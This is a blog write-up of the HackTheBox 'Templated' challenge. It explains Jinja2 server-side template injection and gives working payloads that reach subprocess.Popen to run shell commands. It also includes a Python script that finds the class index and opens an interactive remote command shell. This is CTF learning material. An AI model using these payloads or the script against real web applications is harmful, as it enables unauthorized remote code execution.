<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox - Templated" /><meta property="og:locale" content="en" /><meta name="description" content="SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, really interested me. Add those together and I went about finding out how it worked." /><meta property="og:description" content="SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, really interested me. Add those together and I went about finding out how it worked." /><link rel="canonical" href="https://slimicide.github.io/posts/HackTheBox-Templated/" /><meta property="og:url" content="https://slimicide.github.io/posts/HackTheBox-Templated/" /><meta property="og:site_name" content="Slimicide" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-13T21:30:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Templated" /><meta name="twitter:site" content="@Slimicide_" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-01T03:05:09+00:00","datePublished":"2022-05-13T21:30:00+00:00","description":"SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, really interested me. Add those together and I went about finding out how it worked.","headline":"HackTheBox - Templated","mainEntityOfPage":{"@type":"WebPage","@id":"https://slimicide.github.io/posts/HackTheBox-Templated/"},"url":"https://slimicide.github.io/posts/HackTheBox-Templated/"}</script><title>HackTheBox - Templated | Slimicide</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Slimicide"><meta name="application-name" content="Slimicide"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /avatar.PNG " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Slimicide</a></div><div class="site-subtitle font-italic">Learning to break things responsibly. Writeups 'n Stuff.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/Slimicide" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Slimicide_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','domain.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Templated</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Templated</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Slimicide_">Slimicide</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652477400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-13 </em> </span> <span> Updated <em class="timeago" data-ts="1654052709" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="850 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p>SSTI or Server-Side Template Injection is a vulnerability that always really confused me but at the same time, really interested me. Add those together and I went about finding out how it worked.<br /></p><p>Templating is a way in which developers can take dynamic data from a source and incorporate it into the page. It does this by having placeholder variables written statically in the source and then having those variables replaced with the dynamic data such as user input.<br /></p><p>In the case of Jinja2, these templates would be written in a way for the formatting engine to use them, such as in the case of a 404 page:<br /> <code class="language-plaintext highlighter-rouge">The page {{'directory'}} could not be found</code><br /> Would render as:<br /> <code class="language-plaintext highlighter-rouge">The page 'AAAAA' could not be found</code><br /></p><p>SSTI can occur when user input is concatenated into a template render rather than safely passed into the template. This allows the user to render their own “templates”.<br /></p><p>This is what is presumably happening in HackTheBox Templated. With a name like Templated and the only text on the page referencing an under construction Jinja2 site, the vulnerability isn’t exactly hiding.</p><p><img data-src="/assets/img/HackTheBox/Templated/templated_jinja2.png" alt="Jinja2" title="Jinja2" data-proofer-ignore> <em>Jinja2</em></p><p>Requesting a random directory, we see it is reflected back into the 404 page.</p><p><img data-src="/assets/img/HackTheBox/Templated/templated_404.png" alt="404" title="404" data-proofer-ignore> <em>404</em></p><p>We know it’s running Jinja2, we can try and request <code class="language-plaintext highlighter-rouge">{{7 * 7}}</code> to see if we can inject our own “template”.</p><p><img data-src="/assets/img/HackTheBox/Templated/templated_49.png" alt="49" title="49" data-proofer-ignore> <em>Jinja2 SSTI</em></p><p>Now it gets interesting. We have SSTI. Time to build a payload to get RCE on the container. In Python, everything is an object and so everything involved in the Jinja2 server is accessible by bouncing around to different objects.<br /></p><p>For the first payload, we can bounce back a step to the <code class="language-plaintext highlighter-rouge">string</code> object by requesting:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{"1337".__class__}}
</pre></table></code></div></div><p><img data-src="/assets/img/HackTheBox/Templated/templated_classstr.png" alt="class str" title="class str" data-proofer-ignore> <em>‘&lt;class ‘str’&gt;’</em></p><p>Now that we’re in the <code class="language-plaintext highlighter-rouge">'&lt;class 'str'&gt;'</code> object, we can take another step back to the base of the string object with:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{"1337".__class__.__base__}}
</pre></table></code></div></div><p><img data-src="/assets/img/HackTheBox/Templated/templated_object.png" alt="class object" title="class object" data-proofer-ignore> <em>‘&lt;class ‘object’&gt;’</em></p><p>Now we’re at the origin, since everything in Python is an object, everything inherits from this object meaning we can bounce around anywhere we want. We can stop taking steps back and instead take a step forward into a subclass that’ll allow us to execute commands. In order to enter the subclass we want, we first must list what subclasses are available for use:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{"1337".__class__.__base__.__subclasses__()}}
</pre></table></code></div></div><p><img data-src="/assets/img/HackTheBox/Templated/templated_subclasses.png" alt="subclasses" title="subclasses" data-proofer-ignore> <em>That’s a lot of subclasses</em></p><p><code class="language-plaintext highlighter-rouge">Control + F</code> is your friend. We can use it to search for classes that’ll help us out. In this instance, we can target <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>. This operates like a regular Python list. We need to find the index of <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> in this list. I’ll go over how I found it later, but for now, it’s <code class="language-plaintext highlighter-rouge">[414]</code>:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{"1337".__class__.__base__.__subclasses__()[414]}}
</pre></table></code></div></div><p><img data-src="/assets/img/HackTheBox/Templated/templated_subprocess.png" alt="subprocess" title="subprocess" data-proofer-ignore> <em>subprocess.Popen</em></p><p>Now that we’re right where we want to be. We can achieve RCE with this final payload:<br /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{{"1337".__class__.__base__.__subclasses__()[414]('cat flag.txt', shell=True, stdout=-1).communicate()[0]}}
</pre></table></code></div></div><p><img data-src="/assets/img/HackTheBox/Templated/templated_solved.png" alt="solved" title="solved" data-proofer-ignore> <em>Flag</em></p><p>Now, we’ve solved the challenge but that’s only half the fun. I’m now going to move onto making a nice script to interact with the RCE. This script also includes how I found the index of <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>.</p><hr /><h1 id="script">Script</h1><p>The first half of the script will find the index of <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>. In the interest of not slamming the challenge with ~600 requests to find the index, I ballparked it around 400 - 500. It then simply checked for <code class="language-plaintext highlighter-rouge">subprocess.Popen</code> in all of them and if it finds it, it sets the index in the URL for the second half of the script. You could easily hardcode the index after running it once and scrap this part of the script, but there’s no fun in that.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1">#!/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">challenge</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] Finding Subprocess..."</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">500</span><span class="p">):</span>
	<span class="n">challenge</span> <span class="o">=</span> <span class="s">"http://IP:PORT/{{'abc'.__class__.__base__.__subclasses__()[%s]}}"</span> <span class="o">%</span><span class="n">i</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">challenge</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"subprocess.Popen"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Subprocess Found at [{}]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="k">break</span>
</pre></table></code></div></div><p>Now that we have the index of <code class="language-plaintext highlighter-rouge">subprocess.Popen</code>, we can write the part of the script that’ll interact with it in a terminal-like interface.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="k">print</span><span class="p">(</span><span class="s">"[+] Spawning Shell..."</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Path-IX&gt; "</span><span class="p">)</span>
		<span class="n">shell</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">"('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}"</span> <span class="o">%</span><span class="n">command</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"----------</span><span class="se">\n</span><span class="s">"</span><span class="o">+</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">38</span><span class="p">:</span><span class="o">-</span><span class="mi">30</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">----------"</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Quitting..."</span><span class="p">)</span>
		<span class="n">quit</span><span class="p">()</span>
</pre></table></code></div></div><p>Here it simply sets the RCE payload to whatever command is inputted and keeps it open in a constant loop until KeyboardInterrupt. Added on some extra cleanup at the end of the payload to decode the output and I used Python slices to cut down on the returned 404 message etc. The most satisfying part of writing a script isn’t getting it working, it’s making it look nice.</p><p><img data-src="/assets/img/HackTheBox/Templated/templated_rce.png" alt="Path-IX" title="Path-IX" data-proofer-ignore> <em>Shell?</em></p><p>Full script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1">#!/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="n">challenge</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] Finding Subprocess..."</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span><span class="mi">500</span><span class="p">):</span>
	<span class="n">challenge</span> <span class="o">=</span> <span class="s">"http://IP:PORT/{{'abc'.__class__.__base__.__subclasses__()[%s]}}"</span> <span class="o">%</span><span class="n">i</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">challenge</span><span class="p">)</span>
	<span class="k">if</span> <span class="s">"subprocess.Popen"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[+] Subprocess Found at [{}]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="k">break</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] Spawning Shell..."</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Path-IX&gt; "</span><span class="p">)</span>
		<span class="n">shell</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">"('%s', shell=True, stdout=-1).communicate()[0].decode('utf-8').strip()}}"</span> <span class="o">%</span><span class="n">command</span>
		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"----------</span><span class="se">\n</span><span class="s">"</span><span class="o">+</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">[</span><span class="mi">38</span><span class="p">:</span><span class="o">-</span><span class="mi">30</span><span class="p">]</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">----------"</span><span class="p">)</span>
	<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Quitting..."</span><span class="p">)</span>
		<span class="n">quit</span><span class="p">()</span>
</pre></table></code></div></div><h1>:)</h1></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/challenges/'>Challenges</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/templated/" class="post-tag no-text-decoration" >templated</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/jinja2/" class="post-tag no-text-decoration" >jinja2</a> <a href="/tags/scripting/" class="post-tag no-text-decoration" >scripting</a> <a href="/tags/python/" class="post-tag no-text-decoration" >python</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Templated - Slimicide&amp;url=https://slimicide.github.io/posts/HackTheBox-Templated/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Templated - Slimicide&amp;u=https://slimicide.github.io/posts/HackTheBox-Templated/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://slimicide.github.io/posts/HackTheBox-Templated/&amp;text=HackTheBox - Templated - Slimicide" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HackTheBox-Templated/">HackTheBox - Templated</a><li><a href="/posts/HackTheBox-Forge/">HackTheBox - Forge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/active-directory/">active_directory</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer-overflow</a> <a class="post-tag" href="/tags/evil-winrm/">evil-winrm</a> <a class="post-tag" href="/tags/ldap/">ldap</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HackTheBox-Intelligence/"><div class="card-body"> <em class="timeago small" data-ts="1651771800" > 2022-05-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Intelligence</h3><div class="text-muted small"><p> HackTheBox Intelligence Intelligence is a retired medium Active Directory machine on HackTheBox, this machine was my first real dive into Active Directory exploitation and it was the perfect mach...</p></div></div></a></div><div class="card"> <a href="/posts/Basic-Buffer-Overflows/"><div class="card-body"> <em class="timeago small" data-ts="1662062400" > 2022-09-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Basic Buffer Overflows</h3><div class="text-muted small"><p> Binary exploitation has always interested me. Anything low-level does. You always hear about ROPs and NOPs, Overflows and Shellcode. It’s definitely a very exciting and rewarding skill to learn. Li...</p></div></div></a></div><div class="card"> <a href="/posts/ROPEmporium-Write4/"><div class="card-body"> <em class="timeago small" data-ts="1665489600" > 2022-10-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROPEmporium - Write4</h3><div class="text-muted small"><p> For this second post about Binary Exploitation, I was originally going to do just one step up from the last one, but then I decided the act of pushing arguments onto the stack for use in a function...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/OWASP-Top-10/" class="btn btn-outline-primary" prompt="Older"><p>OWASP Top 10 - OWASP Juice Shop</p></a> <a href="/posts/HackTheBox-Resolute/" class="btn btn-outline-primary" prompt="Newer"><p>HackTheBox - Resolute</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/Slimicide_">Slimicide</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/active-directory/">active_directory</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/bloodhound/">bloodhound</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer-overflow</a> <a class="post-tag" href="/tags/evil-winrm/">evil-winrm</a> <a class="post-tag" href="/tags/ldap/">ldap</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
